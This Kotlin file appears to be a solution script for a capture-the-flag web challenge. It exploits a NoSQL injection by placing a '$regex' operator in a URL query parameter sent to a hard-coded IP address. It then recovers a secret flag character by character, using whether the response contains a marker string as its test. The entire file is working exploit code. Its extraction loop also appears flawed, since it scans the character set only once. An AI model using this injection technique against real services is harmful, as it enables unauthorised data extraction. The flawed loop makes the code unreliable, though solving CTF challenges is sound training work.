package cz.vernjan.ctf.catch21

import java.net.URI
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse

private val CHARS: List<Char> = ('0'..'9') + ('a'..'z') + ('A'..'Z') + '-'

fun main() {
    val httpClient = HttpClient.newBuilder()
        .version(HttpClient.Version.HTTP_1_1)
        .build()

    var flag = ""

    for (ch in CHARS) {
        flag += ch

        val request = HttpRequest.newBuilder()
            .GET()
            // view?title[$regex]=FLAG{$flag.*}
            .uri(URI.create("http://78.128.216.18:65180/view?title%5B%24regex%5D=FLAG%7B$flag%2E%2A%7D"))
            .build()

        val response = httpClient.send(request, HttpResponse.BodyHandlers.ofString()).body()!!
        if (response.contains("This is the flag post.")) {
            println(flag)
            continue
        } else {
            flag = flag.dropLast(1)
        }
    }
}